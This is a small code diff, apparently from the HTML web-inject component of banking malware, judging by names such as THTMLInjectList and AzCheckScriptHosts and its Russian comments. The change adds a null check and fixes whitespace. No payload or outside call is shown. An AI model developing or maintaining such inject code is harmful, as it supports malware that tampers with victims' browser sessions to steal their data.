@@ -159,6 +159,8 @@ void AZInjectExecute(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
 
 void AZInjectsLoadedEvent(LPVOID Sender, int EventId, DWORD WParam, DWORD LParam)
 {
+	if (!Sender) return;
+
 	THTMLInjectList* Injects = (THTMLInjectList*)Sender;
 
 	// Перебираем все инжекты в поисках инжектов  нужной переменной
@@ -190,7 +192,7 @@ void AzCheckScriptHosts()
 	// Инициализируем проверку
 	AzInicializeHostChecker();
 
-    AZDATA::Checker->Check();
+	AZDATA::Checker->Check();
 }
 //-----------------------------------------------------------------------------
 
